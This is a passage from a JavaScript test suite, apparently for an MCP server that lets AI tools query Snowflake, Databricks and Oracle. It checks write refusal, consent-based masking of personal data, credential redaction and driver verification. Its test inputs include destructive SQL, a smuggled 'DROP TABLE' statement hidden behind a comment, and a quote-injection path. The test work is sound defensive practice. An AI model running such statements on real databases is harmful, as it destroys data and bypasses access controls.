      '    colour: blue',
      '    credentials: { resolver: vault }'
    ].join('\n');
    const env = { AUTODE_DATABRICKS_WORKSPACE_URL: 'adb-9.azuredatabricks.net', AUTODE_DATABRICKS_TOKEN: 'never-listed' };
    const cfg = C.parseConnectionsConfig(yaml, env);
    assert.deepStrictEqual(cfg.connections.map((c) => [c.id, c.role, c.credentials.resolver, c.allowSampleDataInPrompts, c.origin]), [
      ['snowflake:prod', 'source', 'cli', true, 'file'],
      ['snowflake:ACME-TGT', 'target', 'env', false, 'file'],
      ['databricks:adb-9.azuredatabricks.net', 'source', 'env', false, 'environment']
    ]);
    assert.ok(cfg.errors.some((e) => /connections\[2\].*token must not be in this file/.test(e)), 'a secret in the committed file invalidates the entry');
    assert.ok(cfg.errors.some((e) => /teradata.*not supported/.test(e)) && cfg.errors.some((e) => /duplicate connection id "snowflake:prod"/.test(e)) && cfg.errors.some((e) => /resolver must be env, cli or vscode/.test(e)));
    assert.ok(!JSON.stringify(cfg).includes('never-listed') && !JSON.stringify(cfg).includes('do-not-commit'));
    // The id is the one the adapter reports once connected, so estate bindings and consent line up.
    const { SnowflakeAdapter } = fresh('../dist/engine/platform/adapters/SnowflakeAdapter.js');
    assert.strictEqual(new SnowflakeAdapter({ connectionName: 'prod' }, () => {}).getConnectionId(), 'snowflake:prod');
    assert.strictEqual(new SnowflakeAdapter({ account: 'ACME-TGT', username: 'deploy' }, () => {}).getConnectionId(), 'snowflake:ACME-TGT');
    // The extension reads consent from the same file.
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-conn-'));
    try {
      nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'connections.yaml'), yaml);
      const consent = C.sampleDataConsentFromWorkspace(ws);
      assert.deepStrictEqual([consent('snowflake:prod'), consent('SNOWFLAKE:PROD'), consent('snowflake:ACME-TGT'), consent('snowflake:other'), consent(undefined)], [true, true, false, false, false]);
      assert.strictEqual(C.sampleDataConsentFromWorkspace(undefined)('snowflake:prod'), false);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // An in-process server with a fake Snowflake adapter: records what reaches the platform.
  const platformHarness = async ({ yaml, allowWrite = false, connectError } = {}) => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
    const { InMemoryTransport } = require('@modelcontextprotocol/sdk/inMemory.js');
    const { createAutodeServer } = fresh('../dist/mcp/server.js');
    const { PlatformSession } = fresh('../dist/mcp/platform.js');
    const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-plat-'));
    nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
    nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'connections.yaml'), yaml ?? 'connections:\n  - platform: snowflake\n    account: ACME\n    username: me\n');
    const executed = [];
    const logs = [];
    const fakeAdapter = (creds) => ({
      async connect() { if (connectError) throw new Error(connectError); return { connected: true, platform: 'snowflake', databaseName: 'D', schemaName: 'S', version: '9', capabilities: {} }; },
      async disconnect() {}, dispose() {},
      getConnectionId: () => `snowflake:${creds.account}`,
      getCapabilities: () => ({}),
      async listDatabases() { return ['D', 'E']; },
      async listSchemas(db) { return [`${db}_RAW`, `${db}_MART`]; },
      async executeQuery(sql, opts) {
        executed.push({ sql, opts });
        if (/^SHOW/i.test(sql)) return { columns: ['name'], rows: [{ name: 'ORDERS' }], rowCount: 1, executionTimeMs: 1 };
        if (/^EXPLAIN/i.test(sql)) return { columns: ['plan'], rows: [{ plan: 'TableScan ORDERS' }], rowCount: 1, executionTimeMs: 1 };
        return { columns: ['order_id', 'email'], rows: [{ order_id: 7, email: 'pat@example.com' }], rowCount: 1, executionTimeMs: 2 };
      },
      async extractMetadata(o) {
        executed.push({ extract: o });
        return { platform: 'snowflake', extractedAt: 't', views: [], foreignKeys: [], lineage: [{ sourceFqn: 'a', targetFqn: 'b', queryText: "WHERE email='q@r.io'" }], tables: [{ schema: 'S', name: 'CUSTOMERS', fqn: 'D.S.CUSTOMERS', type: 'TABLE', columns: [
          { name: 'email', dataType: 'TEXT', isNullable: true, isPrimaryKey: false, isForeignKey: false, ordinalPosition: 1, profile: { distinctCount: 3, minValue: 'a@b.io', maxValue: 'z@y.io' } }] }] };
      }
    });
    const session = new PlatformSession({
      workspaceRoot: ws, allowWrite, allowCli: false, log: (l) => logs.push(l),
      createManager: (log, options) => { const m = new ConnectionManager(log, options); m.registerAdapterFactory('snowflake', (c) => fakeAdapter(c)); return m; }
    });
    const server = createAutodeServer({ workspaceRoot: ws, resourcesRoot: nodePath.join(__dirname, '..'), version: 't', platform: session, log: (l) => logs.push(l) });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await server.connect(a);
    const client = new Client({ name: 't', version: '1' });
    await client.connect(b);
    const call = async (name, args) => (await client.callTool({ name, arguments: args }));
    return { ws, client, call, executed, logs, done: async () => { await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); } };
  };

  await test('v0.37.0: autode_execute_query refuses writes and multiple statements before anything reaches the platform; reads run with maxRows capped', async () => {
    const h = await platformHarness();
    try {
      const tools = (await h.client.listTools()).tools;
      const exec = tools.find((t) => t.name === 'autode_execute_query');
      assert.deepStrictEqual([exec.annotations.readOnlyHint, exec.annotations.destructiveHint, exec.annotations.openWorldHint], [true, false, true]);
      for (const sql of ['INSERT INTO t VALUES (1)', 'MERGE INTO t USING s ON 1=1 WHEN MATCHED THEN DELETE', 'DROP TABLE t', 'CREATE TABLE t (a INT)', 'GRANT ROLE r TO USER u', 'CALL p()', 'SELECT 1 /* ; */ ; DROP TABLE t']) {
        const r = await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql });
        assert.ok(r.isError && ['WRITE_NOT_ALLOWED', 'VALIDATION_FAILED'].includes(r.structuredContent.code), `${sql}: ${JSON.stringify(r.structuredContent)}`);
      }
      assert.strictEqual((await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql: 'SELECT 1; SELECT 2' })).structuredContent.code, 'VALIDATION_FAILED');
      assert.strictEqual(h.executed.length, 0, 'nothing was sent to the platform');
      const ok = await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql: 'SELECT order_id, email FROM orders;' });
      assert.ok(!ok.isError, JSON.stringify(ok.structuredContent));
      assert.deepStrictEqual([h.executed.at(-1).sql, h.executed.at(-1).opts.maxRows], ['SELECT order_id, email FROM orders', 100]);
      assert.ok((await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql: 'SELECT 1', maxRows: 10001 })).structuredContent.code === 'VALIDATION_FAILED', 'hard cap 10 000');
      const unknown = await h.call('autode_execute_query', { connectionId: 'snowflake:nope', sql: 'SELECT 1' });
      assert.ok(unknown.structuredContent.code === 'NOT_FOUND' && unknown.structuredContent.details.known.includes('snowflake:ACME'));
      const listed = (await h.call('autode_list_connections', {})).structuredContent;
      assert.deepStrictEqual(listed.connections.map((c) => [c.id, c.authMode, c.credentials.resolver, c.allowSampleDataInPrompts]), [['snowflake:ACME', 'key-pair', 'env', false]]);
      assert.deepStrictEqual([listed.writeAllowed, listed.cliAllowed], [false, false]);
      assert.deepStrictEqual((await h.call('autode_list_schemas', { connectionId: 'snowflake:ACME', database: 'D' })).structuredContent.schemas, ['D_RAW', 'D_MART']);
      const plan = (await h.call('autode_explain_sql', { connectionId: 'snowflake:ACME', sql: 'CREATE OR REPLACE VIEW v AS SELECT 1' })).structuredContent;
      assert.ok(h.executed.at(-1).sql === 'EXPLAIN USING TEXT CREATE OR REPLACE VIEW v AS SELECT 1' && plan.plan[0].plan === 'TableScan ORDERS', 'EXPLAIN dry-runs a write without running it');
      assert.strictEqual((await h.call('autode_explain_sql', { connectionId: 'snowflake:ACME', sql: 'SELECT 1; DROP TABLE t' })).structuredContent.code, 'VALIDATION_FAILED');
    } finally { await h.done(); }
  });

  await test('v0.37.0: without consent query rows and profile values are withheld (metadata statements pass); with consent personal data is masked', async () => {
    const h = await platformHarness();
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    try {
      const off = (await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql: 'SELECT order_id, email FROM orders' })).structuredContent;
      assert.ok(off.rows === undefined && /withheld/.test(off.withheld) && off.rowCount === 1 && !JSON.stringify(off).includes('pat@example.com'));
      assert.deepStrictEqual((await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql: 'SHOW TABLES' })).structuredContent.rows, [{ name: 'ORDERS' }]);
      const meta = (await h.call('autode_extract_metadata', { connectionId: 'snowflake:ACME', database: 'D', schema: 'S', profile: true })).structuredContent;
      assert.ok(!/a@b\.io|z@y\.io|q@r\.io/.test(JSON.stringify(meta)) && meta.tables[0].columns[0].profile.distinctCount === 3, JSON.stringify(meta.tables[0].columns[0]));
      assert.deepStrictEqual(h.executed.at(-1).extract.schemaFilter, ['D.S']);
      // Consent is read when the call runs: no restart needed.
      nodeFs.writeFileSync(nodePath.join(h.ws, '.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: snowflake\n    account: ACME\n    allowSampleDataInPrompts: true\n');
      const on = (await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql: 'SELECT order_id, email FROM orders' })).structuredContent;
      assert.deepStrictEqual([on.rows, on.maskedColumns], [[{ order_id: 7, email: '[masked]' }], ['email']]);
      const metaOn = (await h.call('autode_extract_metadata', { connectionId: 'snowflake:ACME', database: 'D', schema: 'S', profile: true })).structuredContent;
      assert.strictEqual(metaOn.tables[0].columns[0].profile.minValue, '[masked]');
    } finally { await h.done(); }
  });

  await test('v0.40.0 (v0.45.8): a platform write never runs directly — it is a runbook; the single-statement platform change and --allow-write are retired, an old approved one fails with where to go; connect failures map to the error contract', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const h = await platformHarness();
    try {
      const exec = (await h.client.listTools()).tools.find((t) => t.name === 'autode_execute_query');
      assert.deepStrictEqual([exec.annotations.readOnlyHint, exec.annotations.destructiveHint], [true, false]);
      const direct = (await h.call('autode_execute_query', { connectionId: 'snowflake:ACME', sql: 'INSERT INTO t VALUES (1)' })).structuredContent;
      assert.ok(direct.code === 'WRITE_NOT_ALLOWED' && /autode_propose_runbook/.test(direct.message), JSON.stringify(direct));
      const names = (await h.client.listTools()).tools.map((t) => t.name);
      assert.ok(!names.includes('autode_propose_platform_change') && !names.includes('autode_apply_decision'), 'retired');
      // A platform change approved before v0.45.8 is not run: it says where to go.
      const { DecisionStore } = fresh('../dist/engine/decisions/decisionStore.js');
      const P = fresh('../dist/engine/decisions/proposals.js');
      const store = new DecisionStore(h.ws);
      const old = store.create({ kind: 'platform_change', title: 'Run on snowflake:ACME: INSERT', summary: 'seed', proposal: { connectionId: 'snowflake:ACME', sql: 'INSERT INTO t VALUES (1)', reason: 'seed' }, proposedBy: { host: 'mcp', client: 'test' }, validation: { ok: true, errors: [], warnings: [], checks: [] } });
      store.resolve(old.id, { decision: 'approved', by: 'priya', channel: 'cli' });
      const r = await P.applyDecision(store, old.id, { workspaceRoot: h.ws });
      assert.ok(!r.applied && r.decision.status === 'failed' && /propose it as a runbook/.test(r.message), r.message);
      assert.ok(!h.executed.some((e) => /INSERT/.test(e.sql || '')), 'nothing ran');
      assert.strictEqual(fresh('../dist/mcp/server.js').parseArgs(['--allow-write']).allowWrite, undefined, 'the flag is gone');
      void nodeFs; void nodePath;
    } finally { await h.done(); }
    for (const [error, code] of [['Snowflake SQL API error (401): JWT token is invalid', 'AUTH_FAILED'], ['Insufficient privileges to operate on warehouse', 'PERMISSION_DENIED'], ['fetch failed: ECONNREFUSED', 'CONNECTION_FAILED'], ['Executing queries via the Snowflake CLI requires CLI-execution consent', 'PERMISSION_DENIED']]) {
      const f = await platformHarness({ connectError: error });
      try {
        const r = (await f.call('autode_test_connection', { connectionId: 'snowflake:ACME' })).structuredContent;
        assert.strictEqual(r.code, code, `${error}: ${JSON.stringify(r)}`);
        if (/consent/.test(error)) assert.ok(/--allow-cli/.test(r.message));
      } finally { await f.done(); }
    }
  });
  await test('v0.37.0: redaction — no tool response or server log line carries a credential from the environment (bundled server over stdio)', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
    const { StdioClientTransport } = require('@modelcontextprotocol/sdk/client/stdio.js');
    const fake = (...parts) => parts.join('');
    const token = fake('da', 'pi', '0123456789abcdef'.repeat(2));
    const password = fake('Pw-', 'x7Q', '-never-shown');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-redact-'));
    const env = { ...process.env, AUTODE_DATABRICKS_WORKSPACE_URL: '127.0.0.1:1', AUTODE_DATABRICKS_HTTP_PATH: '/sql/1.0/warehouses/abc', AUTODE_DATABRICKS_TOKEN: token, AUTODE_SNOWFLAKE_ACCOUNT: 'ACME', AUTODE_SNOWFLAKE_USERNAME: 'me', AUTODE_SNOWFLAKE_AUTH_MODE: 'username-password', AUTODE_SNOWFLAKE_PASSWORD: password };
    const transport = new StdioClientTransport({ command: process.execPath, args: [nodePath.join(__dirname, '..', 'dist', 'mcp-server.js'), '--workspace', ws], env, stderr: 'pipe' });
    let stderr = '';
    transport.stderr.on('data', (d) => { stderr += String(d); });
    const client = new Client({ name: 't', version: '1' });
    await client.connect(transport);
    try {
      const responses = [];
      const listed = await client.callTool({ name: 'autode_list_connections', arguments: {} });
      responses.push(listed);
      assert.deepStrictEqual(listed.structuredContent.connections.map((c) => c.id).sort(), ['databricks:127.0.0.1:1', 'snowflake:ACME']);
      const db = await client.callTool({ name: 'autode_test_connection', arguments: { connectionId: 'databricks:127.0.0.1:1' } });
      responses.push(db);
      assert.ok(db.isError && db.structuredContent.code === 'CONNECTION_FAILED', JSON.stringify(db.structuredContent));
      const sf = await client.callTool({ name: 'autode_execute_query', arguments: { connectionId: 'snowflake:ACME', sql: 'SELECT 1' } });
      responses.push(sf);
      assert.ok(sf.isError && sf.structuredContent.code === 'PERMISSION_DENIED' && /--allow-cli/.test(sf.structuredContent.message), 'username/password needs the CLI, which needs consent');
      await new Promise((r) => setTimeout(r, 100));
      const all = JSON.stringify(responses) + stderr;
      assert.ok(stderr.includes('autode_test_connection failed'), 'the failure was logged');
      for (const s of [token, password]) assert.ok(!all.includes(s), `leaked ${s.slice(0, 6)}…`);
    } finally { await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.37.0: with allowSampleDataInPrompts off no sampled value reaches the persisted schema graph or an assembled context pack; with it on, personal-data columns are masked', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
    const { SnowflakeAdapter } = fresh('../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const { buildContextPack } = fresh('../dist/engine/context/contextPack.js');
    const { parseCsv } = fresh('../dist/engine/context/fileIngestion.js');
    class Fake extends SnowflakeAdapter {
      async connect() { return { connected: true, platform: 'snowflake', databaseName: 'D', schemaName: 'S', version: '9', capabilities: this.getCapabilities() }; }
      async extractMetadata() {
        return { platform: 'snowflake', connectionId: this.getConnectionId(), extractedAt: 't', views: [], foreignKeys: [],
          lineage: [{ sourceFqn: 'D.S.RAW', targetFqn: 'D.S.CUSTOMERS', queryText: "INSERT INTO CUSTOMERS SELECT * FROM RAW WHERE EMAIL='zz-sample-1@corp.example'" }],
          tables: [{ schema: 'S', name: 'CUSTOMERS', fqn: 'D.S.CUSTOMERS', type: 'TABLE', columns: [
            { name: 'EMAIL', dataType: 'TEXT', isNullable: true, isPrimaryKey: false, isForeignKey: false, ordinalPosition: 1, profile: { distinctCount: 2, nullCount: 0, minValue: 'zz-sample-2@corp.example', maxValue: 'zz-sample-3@corp.example' } },
            { name: 'TIER', dataType: 'TEXT', isNullable: true, isPrimaryKey: false, isForeignKey: false, ordinalPosition: 2, profile: { distinctCount: 2, nullCount: 0, minValue: 'ZZSAMPLEGOLD', maxValue: 'ZZSAMPLESILVER' } }] }] };
      }
    }
    const values = ['zz-sample-1@corp.example', 'zz-sample-2@corp.example', 'zz-sample-3@corp.example', 'ZZSAMPLEGOLD', 'ZZSAMPLESILVER'];
    const run = async (consent) => {
      const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-consent-'));
      try {
        const m = new ConnectionManager(() => {}, { sampleDataConsent: (id) => consent && id === 'snowflake:ACME' });
        m.registerAdapterFactory('snowflake', (c, l) => new Fake(c, l));
        await m.connect('snowflake', { account: 'ACME', username: 'me' });
        const snapshot = await m.extractMetadata({ includeProfiling: true });
        await m.persistSchemaContext(snapshot, ws);
        const persisted = nodeFs.readFileSync(nodePath.join(ws, '.autode', 'local', 'schema-graph.json'), 'utf8');
        const graph = JSON.parse(persisted);
        const pack = buildContextPack({ purpose: 'step', query: 'customers email tier' }, { graph, assertions: [], conflicts: [] });
        return { text: persisted + JSON.stringify(snapshot) + pack.text, pack: pack.text };
      } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
    };
    const off = await run(false);
    assert.ok(/CUSTOMERS/i.test(off.pack), 'the pack still describes the table');
    for (const v of values) assert.ok(!off.text.includes(v), `sample value ${v} leaked with consent off`);
    const on = await run(true);
    assert.ok(on.text.includes('ZZSAMPLESILVER'), 'with consent, non-personal values are kept');
    for (const v of values.slice(1, 3)) assert.ok(!on.text.includes(v), `personal value ${v} not masked`);
    // CSV ingestion infers types from the rows but keeps no values.
    const csv = parseCsv('customer_id,email,tier\n1,zz-csv@corp.example,ZZCSVGOLD\n2,b@corp.example,SILVER\n', 'customers.csv', { system: 'shop', environment: 'prod' });
    assert.ok(!/zz-csv@corp\.example|ZZCSVGOLD/.test(JSON.stringify(csv)), 'CSV ingestion keeps no row values');
  });

  // ── v0.38.0: DRV1 — platform prerequisites, moderated driver installation, Oracle as a source ──
  // A fake node-oracledb on disk: answers the dictionary queries the adapter sends, through a hook the test sets.
  const FAKE_ORACLEDB = `
    'use strict';
    exports.OUT_FORMAT_OBJECT = 4002; exports.CLOB = 2017; exports.NCLOB = 2019; exports.thin = true;
    exports.getConnection = async (config) => {
      const h = globalThis.__autodeFakeOracle;
      if (!h) throw new Error('no fake handler');
      if (h.connectError) throw new Error(h.connectError);
      h.configs.push(config);
      return {
        oracleServerVersionString: '19.22.0.0.0',
        async execute(sql, binds, opts) { h.sql.push(sql); return h.answer(sql, opts); },
        async close() { h.closed++; }
      };
    };`;
  const oracleDictionary = () => {
    const h = { configs: [], sql: [], closed: 0 };
    h.answer = (sql, opts) => {
      const rows = (r) => ({ rows: opts && opts.maxRows ? r.slice(0, opts.maxRows) : r, metaData: r[0] ? Object.keys(r[0]).map((name) => ({ name })) : [] });
      if (/SYS_CONTEXT\('USERENV', 'CON_NAME'\) AS "db"/.test(sql)) return rows([{ db: 'ORCLPDB1', schema: 'HR' }]);
      if (/FROM all_users/.test(sql)) return rows([{ name: 'HR' }, { name: 'SALES' }]);
      if (/FROM all_tables t/.test(sql)) return rows([
        { table_schema: 'HR', table_name: 'DEPARTMENTS', table_type: 'TABLE', row_count: 27, last_altered: new Date('2026-01-02T03:04:05Z'), comment: null },
        { table_schema: 'HR', table_name: 'EMPLOYEES', table_type: 'TABLE', row_count: 107, last_altered: new Date('2026-01-02T03:04:05Z'), comment: 'Staff' },
        { table_schema: 'HR', table_name: 'EMP_V', table_type: 'VIEW', row_count: null, last_altered: new Date('2026-01-02T03:04:05Z'), comment: null }]);
      if (/FROM all_tab_columns c/.test(sql)) return rows([
        { table_schema: 'HR', table_name: 'DEPARTMENTS', column_name: 'DEPARTMENT_ID', data_type: 'NUMBER(4,0)', is_nullable: 'NO', ordinal_position: 1, comment: null },
        { table_schema: 'HR', table_name: 'EMPLOYEES', column_name: 'EMPLOYEE_ID', data_type: 'NUMBER(6,0)', is_nullable: 'NO', ordinal_position: 1, comment: null },
        { table_schema: 'HR', table_name: 'EMPLOYEES', column_name: 'EMAIL', data_type: 'VARCHAR2(25)', is_nullable: 'NO', ordinal_position: 2, comment: 'Work e-mail' },
        { table_schema: 'HR', table_name: 'EMPLOYEES', column_name: 'DEPARTMENT_ID', data_type: 'NUMBER(4,0)', is_nullable: 'YES', ordinal_position: 3, comment: null },
        { table_schema: 'HR', table_name: 'EMPLOYEES', column_name: 'RESUME', data_type: 'CLOB', is_nullable: 'YES', ordinal_position: 4, comment: null }]);
      if (/constraint_type = 'P'/.test(sql)) return rows([{ table_schema: 'HR', table_name: 'EMPLOYEES', column_name: 'EMPLOYEE_ID' }, { table_schema: 'HR', table_name: 'DEPARTMENTS', column_name: 'DEPARTMENT_ID' }]);
      if (/constraint_type = 'R'/.test(sql)) return rows([{ source_schema: 'HR', source_table: 'EMPLOYEES', source_column: 'DEPARTMENT_ID', target_schema: 'HR', target_table: 'DEPARTMENTS', target_column: 'DEPARTMENT_ID', constraint_name: 'EMP_DEPT_FK' }]);
      if (/FROM all_views/.test(sql)) return rows([{ table_schema: 'HR', table_name: 'EMP_V', view_definition: 'select employee_id from employees' }]);
      if (/COUNT\(\*\) AS row_count/.test(sql)) return rows([{ ROW_COUNT: 107, D_0: 107, N_0: 0, D_1: 107, N_1: 0, D_2: 11, N_2: 1 }]);
      if (/^EXPLAIN PLAN FOR/.test(sql)) return { rows: undefined, metaData: undefined };
      if (/DBMS_XPLAN/.test(sql)) return rows([{ plan: 'Plan hash value: 1445457117' }]);
      if (/product_component_version/.test(sql)) return rows([{ database: 'ORCLPDB1', schema: 'HR', version: '19.0.0.0.0' }]);
      if (/^SELECT employee_id/i.test(sql)) return rows([{ EMPLOYEE_ID: 100, EMAIL: 'SKING' }]);
      return rows([]);
    };
    globalThis.__autodeFakeOracle = h;
    return h;
  };
  /** A drivers root with the fake package "installed" by npm (package.json, package-lock.json, node_modules/oracledb). */
  const oracleDriversRoot = ({ version = '6.5.1', body = FAKE_ORACLEDB } = {}) => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const root = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-drivers-'));
    const dir = nodePath.join(root, 'oracle');
    nodeFs.mkdirSync(nodePath.join(dir, 'node_modules', 'oracledb'), { recursive: true });
    nodeFs.writeFileSync(nodePath.join(dir, 'package.json'), JSON.stringify({ dependencies: { oracledb: `^${version}` } }));
    nodeFs.writeFileSync(nodePath.join(dir, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/oracledb': { version, integrity: 'sha512-fake' } } }));
    nodeFs.writeFileSync(nodePath.join(dir, 'node_modules', 'oracledb', 'package.json'), JSON.stringify({ name: 'oracledb', version, main: 'index.js' }));
    nodeFs.writeFileSync(nodePath.join(dir, 'node_modules', 'oracledb', 'index.js'), body);
    return { root, dir, done: () => nodeFs.rmSync(root, { recursive: true, force: true }) };
  };
  const tnsFolder = (text) => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const dir = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-tns-'));
    nodeFs.writeFileSync(nodePath.join(dir, 'tnsnames.ora'), text);
    return { dir, done: () => nodeFs.rmSync(dir, { recursive: true, force: true }) };
  };
  const TNS = [
    '# test tnsnames',
    'PRODDB =',
    '  (DESCRIPTION =',
    '    (ADDRESS = (PROTOCOL = TCP)(HOST = db1.corp)(PORT = 1521))',
    '    (CONNECT_DATA = (SERVICE_NAME = prod.corp))',
    '  )',
    'REPORTING, REPORTING_RO = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = db2)(PORT = 1521))(CONNECT_DATA = (SERVICE_NAME = rpt)))',
    'IFILE = /etc/oracle/more_tnsnames.ora'
  ].join('\n');

  await test('v0.38.0: driver store — install command, verification record, and a changed folder is not loaded', () => {
    const D = fresh('../dist/engine/platform/driverStore.js');
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    assert.strictEqual(D.driversRoot('', {}), nodePath.join(os.homedir(), '.autode', 'drivers'));
    assert.strictEqual(D.driversRoot('', { AUTODE_DRIVERS_DIR: '/opt/autode-drivers' }), nodePath.resolve('/opt/autode-drivers'));
    assert.strictEqual(D.driversRoot('/srv/drv', { AUTODE_DRIVERS_DIR: '/opt/x' }), nodePath.resolve('/srv/drv'), 'the setting wins');
    const cmd = D.installCommand(nodePath.resolve('/srv/drv'), 'oracle');
    assert.strictEqual(cmd.command, `npm install --prefix "${nodePath.join(nodePath.resolve('/srv/drv'), 'oracle')}" --ignore-scripts --no-audit --no-fund "oracledb@^6.0.0"`);
    assert.throws(() => D.installCommand('/srv/"evil', 'oracle'), /can't be quoted safely/);
    const empty = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-drv-empty-'));
    try { assert.strictEqual(D.driverStatus(empty, 'oracle').state, 'missing'); } finally { nodeFs.rmSync(empty, { recursive: true, force: true }); }
    const f = oracleDriversRoot();
    try {
      assert.strictEqual(D.driverStatus(f.root, 'oracle').state, 'unverified');
      assert.throws(() => D.loadDriver(f.root, 'oracle'), (e) => e.name === 'DriverNotReadyError' && /Verify Oracle Driver/.test(e.message), 'an unverified driver is not loaded');
      const v = D.verifyDriver(f.root, 'oracle', new Date('2026-10-16T10:00:00Z'));
      assert.deepStrictEqual([v.state, v.version], ['ready', '6.5.1'], v.detail);
      const record = JSON.parse(nodeFs.readFileSync(nodePath.join(f.dir, '.autode-driver.json'), 'utf8'));
      assert.deepStrictEqual([record.package, record.version, record.verifiedAt, record.lockfileSha256.length], ['oracledb', '6.5.1', '2026-10-16T10:00:00.000Z', 64]);
      assert.strictEqual(typeof D.loadDriver(f.root, 'oracle').getConnection, 'function');
      nodeFs.appendFileSync(nodePath.join(f.dir, 'package-lock.json'), ' ');
      assert.strictEqual(D.driverStatus(f.root, 'oracle').state, 'changed');
      assert.throws(() => D.loadDriver(f.root, 'oracle'), /changed after it was verified/);
    } finally { f.done(); }
    const old = oracleDriversRoot({ version: '5.5.0' });
    try { assert.strictEqual(D.verifyDriver(old.root, 'oracle').state, 'unsupported'); } finally { old.done(); }
    const wrong = oracleDriversRoot({ version: '6.0.0', body: 'exports.thin = true;' });
    try { const r = D.verifyDriver(wrong.root, 'oracle'); assert.ok(r.state === 'unverified' && /getConnection/.test(r.detail), r.detail); } finally { wrong.done(); }
    const thick = oracleDriversRoot({ version: '6.0.0', body: 'exports.thin = false; exports.getConnection = async () => ({});' });
    try { assert.ok(/Thick mode/.test(D.verifyDriver(thick.root, 'oracle').detail)); } finally { thick.done(); }
  });

  await test('v0.38.0: prerequisites — states per platform, and the install step is blocked with guidance when npm is missing', async () => {
    const P = fresh('../dist/engine/platform/prerequisites.js');
    const f = oracleDriversRoot();
    try {
      const noNpm = { found: false, detail: 'npm was not found on PATH. Install Node.js' };
      let list = await P.checkPrerequisites({ driversRoot: f.root, platforms: ['oracle'], npm: noNpm });
      assert.deepStrictEqual(list.map((p) => [p.id, p.kind, p.required, p.state]), [['oracle-driver', 'driver', true, 'unverified']]);
      fresh('../dist/engine/platform/driverStore.js').verifyDriver(f.root, 'oracle');
      list = await P.checkPrerequisites({ driversRoot: f.root, platforms: ['oracle'], npm: noNpm });
      assert.strictEqual(list[0].state, 'ready');
      const os = require('node:os'); const nodePath = require('node:path');
      const missing = await P.checkPrerequisites({ driversRoot: nodePath.join(os.tmpdir(), 'autode-no-such-drivers'), platforms: ['oracle'], npm: noNpm });
      assert.ok(missing[0].state === 'missing' && /--ignore-scripts/.test(missing[0].install.command) && /Node\.js/.test(missing[0].install.blocked), JSON.stringify(missing[0].install));
      assert.ok(missing[0].install.notes.some((n) => /12\.1/.test(n)) && /Apache-2\.0/.test(missing[0].install.licence));
      assert.deepStrictEqual(P.detectNpm(() => ({ status: 0, stdout: '10.8.2\n' })), { found: true, version: '10.8.2', detail: 'npm 10.8.2' });
      assert.strictEqual(P.detectNpm(() => { throw new Error('ENOENT'); }).found, false);
      assert.strictEqual(P.detectNpm(() => ({ status: 1, stdout: '' })).found, false);
    } finally { f.done(); }
  });

  await test('v0.38.0: tnsnames.ora — aliases (multi-alias entries, nested and multi-line), Oracle\'s lookup order, and clear errors', () => {
    const T = fresh('../dist/engine/platform/credentials/tnsnames.js');
    assert.deepStrictEqual(T.parseTnsAliases(TNS), { aliases: ['PRODDB', 'REPORTING', 'REPORTING_RO'], includes: ['/etc/oracle/more_tnsnames.ora'] });
    assert.deepStrictEqual(T.tnsLocations('/cfg', { TNS_ADMIN: '/tns', ORACLE_HOME: '/oh' }).map((l) => l.source), ['configDir', 'TNS_ADMIN', 'ORACLE_HOME']);
    const t = tnsFolder(TNS);
    try {
      assert.deepStrictEqual(T.resolveConnectString('proddb', undefined, { TNS_ADMIN: t.dir }), { configDir: t.dir }, 'aliases match case-insensitively; TNS_ADMIN is used');
      assert.deepStrictEqual(T.resolveConnectString('db1.corp:1521/prod.corp', undefined, {}), { configDir: undefined }, 'Easy Connect needs no tnsnames.ora');
      const unknown = T.resolveConnectString('NOPE', t.dir, {});
      assert.ok(/may come from an included file/.test(unknown.warning) && unknown.configDir === t.dir, 'with IFILE present the driver decides');
      const noTns = T.resolveConnectString('PRODDB', undefined, {});
      assert.ok(/TNS_ADMIN/.test(noTns.problem) && /Easy Connect/.test(noTns.problem));
    } finally { t.done(); }
    const plain = tnsFolder('PRODDB = (DESCRIPTION = (ADDRESS = (HOST = h)))\n');
    try {
